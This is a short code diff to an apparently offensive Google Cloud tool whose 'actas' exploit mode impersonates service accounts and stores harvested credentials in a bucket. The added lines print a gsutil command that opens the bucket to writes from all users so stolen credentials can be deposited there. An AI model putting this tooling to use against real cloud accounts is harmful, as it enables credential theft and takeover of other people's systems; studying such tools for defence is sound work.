@@ -209,6 +209,9 @@ def main():
             sys.exit()
         exploit_cmd = args.exploit
         if exploit_cmd == "actas":
+            if args.bucket:
+                print("MAKE SURE YOU GIVE ALL USERS *WRITE* ACCESS TO YOUR BUCKET WITH gsutil iam ch allUsers:objectCreator gs://{}".format(args.bucket))
+
             if args.actasmethod =="vm" and not args.bucket:
                 print("What bucket do you want to store credentials into?")
                 print("set --bucket <bucket>")
